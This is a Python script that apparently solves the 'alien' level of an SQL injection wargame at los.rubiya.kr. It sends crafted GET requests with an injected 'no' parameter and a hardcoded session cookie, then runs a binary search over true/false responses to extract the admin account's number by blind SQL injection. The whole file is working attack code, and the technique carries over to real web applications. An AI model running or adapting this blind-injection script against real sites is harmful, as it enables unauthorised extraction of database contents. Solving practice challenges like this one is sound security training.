#!/usr/bin/env python3
# coding: utf-8

import requests
from math import floor

headers = {
    'Cookie': 'PHPSESSID=6b28r4o43epapipkuj2n3oposs',
}

def is_true(query):
    url = 'https://los.rubiya.kr/chall/alien_91104597bf79b4d893425b65c166d484.php?no=0%26%26id="ad""min"%26%26{0}'.format(query)
    r = requests.get(url, headers=headers)
    if r.text.find('<br>sandbox1') > -1:
        return True
    return False


def guess_no():
    bottom = 0
    top = 0xffffff
    while True:
        mid = floor((bottom + top) / 2)
        print('top :', top, ' | mid :', mid, ' | bottom :', bottom)
        query = "no>{0}".format(mid)
        if is_true(query):
            if top == bottom:
                return mid
            bottom = mid + 1
        else:
            if mid == top:
                return mid
            top = mid


def main():
    print("[*] admin no :", guess_no())


if __name__ == '__main__':
    main()



